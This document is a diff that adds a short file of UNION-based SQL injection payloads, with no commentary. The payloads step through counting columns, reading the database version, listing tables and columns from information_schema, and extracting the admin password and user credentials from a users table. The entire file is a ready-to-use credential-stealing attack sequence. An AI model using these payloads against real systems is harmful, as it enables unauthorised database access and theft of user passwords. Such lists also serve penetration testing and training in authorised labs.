@@ -1,0 +1,12 @@
+' ORDER BY 1 -- 
+
+' UNION select null,@@version,null-- -
+
+' UNION SELECT null,table_name,null FROM information_schema.tables LIMIT 1 OFFSET 0-- -
+
+' UNION SELECT null,column_name,null FROM information_schema.columns WHERE  table_name = 'users' LIMIT 1 OFFSET 0-- -
+
+' UNION select null,password,null FROM users WHERE username = 'admin'-- -
+
+' UNION select null,username,null FROM users WHERE id = 1-- -
+' UNION select null,password,null FROM users WHERE id = 1-- -
